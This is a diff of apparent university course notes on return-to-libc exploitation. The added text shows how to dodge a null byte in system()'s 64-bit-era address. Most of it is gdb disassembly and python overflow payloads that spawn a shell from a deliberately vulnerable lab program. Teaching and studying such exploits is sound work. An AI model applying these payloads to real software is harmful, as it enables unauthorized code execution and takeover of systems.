@@ -204,8 +204,8 @@ Note, that in this example code, we `#include` the `stdlib.h`, which is
 the C standard library, and will include all the goodies we need for
 this exploit, namely, the `system()` function.
 
-The first thing we need to do is determine *where* the `system()` call
-is loaded.
+The first thing we need to do is determine *where* the `system()` call is
+loaded. Here's running this on a 32-bit installation of Ubuntu linux.
 
 ``` example
 (gdb) br main
@@ -219,9 +219,111 @@ Breakpoint 1, main (argc=1, argv=0xbffff734) at vulnerable.c:29
 $1 = {<text variable, no debug info>} 0xb7e5a190 <__libc_system>
 ```
 
-So at address 0xb735a190 is the start of the system. Let's try and use
-that in our exploit. First, we need to setup the exploit, and we'll do
-that in the normal way.
+So at address 0xb735a190 is the start of the system., and we could use that in
+our exploit. But **NEW THIS YEAR** on our 64-bit linux machines, when I looked
+up the address of `system()` something interesting occurred:
+
+``` example
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e26200 <system>
+```
+
+Note that the address `0xf7e26200` contains a null byte! That's really
+problematic. Maybe, someone in the linux community changed the way libc compiled
+to make it more difficult to do this attack? Maybe it was just dumb luck? Either
+way, we need to find a workaround. 
+
+One thing to consider is that there's nothing requiring us to jump exactly to
+`0xf7e26200`, we could jump earlier or later, as long as we get the same
+functionality. Let's look closer at the code for `system()`
+
+``` example
+(gdb) x/10i 0xf7e26200
+   0xf7e26200 <system>:	sub    esp,0xc
+   0xf7e26203 <system+3>:	mov    eax,DWORD PTR [esp+0x10]
+   0xf7e26207 <system+7>:	call   0xf7f2037d
+   0xf7e2620c <system+12>:	add    edx,0x19adf4
+   0xf7e26212 <system+18>:	test   eax,eax
+   0xf7e26214 <system+20>:	je     0xf7e26220 <system+32>
+   0xf7e26216 <system+22>:	add    esp,0xc
+   0xf7e26219 <system+25>:	jmp    0xf7e25ce0
+   0xf7e2621e <system+30>:	xchg   ax,ax
+   0xf7e26220 <system+32>:	lea    eax,[edx-0x59f29]
+```
+
+At the address of the `mov` command, `0xf7e26203` we could jump there? But, this
+means we don't do the `sub` command, and that's important because the `mov`
+offsets from the stack pointer when assigning to `eax` in preparation for the
+system call. We could consider this in priming our exploit, but it would be a
+lot better if we can just blindly return-2-libc without having to do more offset
+calculations and whatnot.
+
+What about subtracting from the start of system, how does the instructions
+change?
+
+``` example
+(gdb) x/10i 0xf7e26200-1
+   0xf7e261ff:	add    BYTE PTR [ebx+0x448b0cec],al
+   0xf7e26205 <system+5>:	and    al,0x10
+   0xf7e26207 <system+7>:	call   0xf7f2037d
+   0xf7e2620c <system+12>:	add    edx,0x19adf4
+   0xf7e26212 <system+18>:	test   eax,eax
+   0xf7e26214 <system+20>:	je     0xf7e26220 <system+32>
+   0xf7e26216 <system+22>:	add    esp,0xc
+   0xf7e26219 <system+25>:	jmp    0xf7e25ce0
+   0xf7e2621e <system+30>:	xchg   ax,ax
+   0xf7e26220 <system+32>:	lea    eax,[edx-0x59f29]
+(gdb) x/10i 0xf7e26200-2
+   0xf7e261fe:	add    BYTE PTR es:[ebx+0x448b0cec],al
+   0xf7e26205 <system+5>:	and    al,0x10
+   0xf7e26207 <system+7>:	call   0xf7f2037d
+   0xf7e2620c <system+12>:	add    edx,0x19adf4
+   0xf7e26212 <system+18>:	test   eax,eax
+   0xf7e26214 <system+20>:	je     0xf7e26220 <system+32>
+   0xf7e26216 <system+22>:	add    esp,0xc
+   0xf7e26219 <system+25>:	jmp    0xf7e25ce0
+   0xf7e2621e <system+30>:	xchg   ax,ax
+   0xf7e26220 <system+32>:	lea    eax,[edx-0x59f29]
+(gdb) x/10i 0xf7e26200-3
+   0xf7e261fd:	je     0xf7e26225 <system+37>
+   0xf7e261ff:	add    BYTE PTR [ebx+0x448b0cec],al
+   0xf7e26205 <system+5>:	and    al,0x10
+   0xf7e26207 <system+7>:	call   0xf7f2037d
+   0xf7e2620c <system+12>:	add    edx,0x19adf4
+   0xf7e26212 <system+18>:	test   eax,eax
+   0xf7e26214 <system+20>:	je     0xf7e26220 <system+32>
+   0xf7e26216 <system+22>:	add    esp,0xc
+   0xf7e26219 <system+25>:	jmp    0xf7e25ce0
+   0xf7e2621e <system+30>:	xchg   ax,ax
+(gdb) x/10i 0xf7e26200-4
+   0xf7e261fc:	lea    esi,[esi+eiz*1+0x0]
+   0xf7e26200 <system>:	sub    esp,0xc
+   0xf7e26203 <system+3>:	mov    eax,DWORD PTR [esp+0x10]
+   0xf7e26207 <system+7>:	call   0xf7f2037d
+   0xf7e2620c <system+12>:	add    edx,0x19adf4
+   0xf7e26212 <system+18>:	test   eax,eax
+   0xf7e26214 <system+20>:	je     0xf7e26220 <system+32>
+   0xf7e26216 <system+22>:	add    esp,0xc
+   0xf7e26219 <system+25>:	jmp    0xf7e25ce0
+   0xf7e2621e <system+30>:	xchg   ax,ax
+```
+
+After subtracting 1 byte, we can see that we get a valid set of instructions,
+but due to the non-risc nature of x86 (remember it is a complex instruction
+set), the offsets change of the instructions, mangling the call. However, if we
+keep stepping backwards, eventually, after 4 bytes, we get a valid instruction
+sequence whereby the instructions of system are unchanged. 
+
+So what if we jump to `0xf7e261fc`? This is a `lea` and so it's just
+adding/multiplying. In other words, it's a no-op! It has no bearing on the
+remainder of the instructions. That means we can just use `0xf7e261fc` as our
+address for `system()`.
+
+
+## Jumping to system
+
+Let's try and use that in our exploit. First, we need to setup the exploit, and
+we'll do that in the normal way.
 
 We can find the length of the buffer to the exploit:
 
@@ -255,19 +357,7 @@ We can find the length of the buffer to the exploit:
 Then we can setup the overflow:
 
 ``` example
-user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\xef\xbe\xad\xde'"`
-Segmentation fault (core dumped)
-user@si485H-base:demo$ dmesg | tail -1
-[ 2138.032640] vulnerable[2283]: segfault at deadbeef ip deadbeef sp bffff690 error 15
-```
-
-## Jumping to system
-
-Once the exploit is setup, now we only need to replace 0xdeadbeef with
-0xb7e5a190 to jump the system call:
-
-``` example
-user@si485H-base:demo$ ./vulnerable 10 `python -c "print 'A'*(0x2c+4)+'\x90\xa1\xe5\xb7'"`
+user@si485H-base:demo$ ./vulnerable 10 `python -c "import struct; print 'A'*(0x2c+4)+struct.pack('<I',0xf7e261fc)"`
 sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
 Segmentation fault (core dumped)
 ```
@@ -284,17 +374,18 @@ and moreover, the system() command accepts valid bash directives. so we
 can do the following:
 
 ``` example
-user@si485H-base:demo$ ./vulnerable 10 `python -c "cmd='/bin/sh;';print cmd+'A'*(0x2c+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
+user@si485H-base:demo$ ./vulnerable 10 `python -c "import struct; cmd='/bin/sh;';print cmd+'A'*(0x2c+4-len(cmd))+struct.pack('<I',0xf7e261fc)"`
 $
 ```
 
-And, boom shell! What we did, is we inserted a "/bin/sh;" at the start
+And, boom shell! 
+
+What we did, is we inserted a "/bin/sh;" at the start
 of our input string so that it will execute the shell. But there is
 still a bunch of A's to follow that will cause an error, and exiting the
 program, does just that:
 
 ``` example
-user@si485H-base:demo$ ./vulnerable 10 `python -c "cmd='/bin/sh;';print cmd+'A'*(0x2c+4-len(cmd))+'\x90\xa1\xe5\xb7'"`
 $ 
 sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???: not found
 Segmentation fault (core dumped)
@@ -342,7 +433,7 @@ for the vulnerable function prior to the leave/ret:
          |---------|
          |   n     |
          |---------|
-         | ret adr | ----> 0xb7e5a190 (system+0x0)
+         | ret adr | ----> system - 0x4
          |---------|
   ebp -> | sbp     |
          |---------|
@@ -367,31 +458,24 @@ After the leave/return we are left with this:
 We can further look at the code for system:
 
 ``` example
-Dump of assembler code for function __libc_system:
-   0xb7e5a190 <+0>: push   ebx
-   0xb7e5a191 <+1>: sub    esp,0x8                      
-   0xb7e5a194 <+4>: mov    eax,DWORD PTR [esp+0x10]
-   0xb7e5a198 <+8>: call   0xb7f4094b <__x86.get_pc_thunk.bx>
-   0xb7e5a19d <+13>:    add    ebx,0x169e63
-   0xb7e5a1a3 <+19>:    test   eax,eax
-   0xb7e5a1a5 <+21>:    je     0xb7e5a1b0 <__libc_system+32>
-   0xb7e5a1a7 <+23>:    add    esp,0x8
-   0xb7e5a1aa <+26>:    pop    ebx
-   0xb7e5a1ab <+27>:    jmp    0xb7e59c20 <do_system>   <---------!!!!
-   0xb7e5a1b0 <+32>:    lea    eax,[ebx-0x495d4]
-   0xb7e5a1b6 <+38>:    call   0xb7e59c20 <do_system>
-   0xb7e5a1bb <+43>:    test   eax,eax
-   0xb7e5a1bd <+45>:    sete   al
-   0xb7e5a1c0 <+48>:    add    esp,0x8
-   0xb7e5a1c3 <+51>:    movzx  eax,al
-   0xb7e5a1c6 <+54>:    pop    ebx
-   0xb7e5a1c7 <+55>:    ret    
+   0xf7e26200 <system>:	sub    esp,0xc
+   0xf7e26203 <system+3>:	mov    eax,DWORD PTR [esp+0x10]
+   0xf7e26207 <system+7>:	call   0xf7f2037d
+   0xf7e2620c <system+12>:	add    edx,0x19adf4
+   0xf7e26212 <system+18>:	test   eax,eax
+   0xf7e26214 <system+20>:	je     0xf7e26220 <system+32>
+   0xf7e26216 <system+22>:	add    esp,0xc
+   0xf7e26219 <system+25>:	jmp    0xf7e25ce0
+   0xf7e2621e <system+30>:	xchg   ax,ax
+   0xf7e26220 <system+32>:	lea    eax,[edx-0x59f29]
 ```
 
-The `do_system` function is the thing that really does the work for the
-system call, and it just so happens that the argument to system when
-`do_system()` is called needs to be the **second** value on the stack,
-which is exactly what we have! This might not always be the case.
+Note that at the return to system from the vulnerable program, the address of
+our input string should be at `$esp+0x4`. The `sub esp,0xc` instruction moves
+the stack such that `$esp+0x10` and that's set to `$eax` for the remainder of
+the functions. It just works out ... remember this alignment for latter when we
+do ROP.
+
 
 # Harder Return to Lib C
 
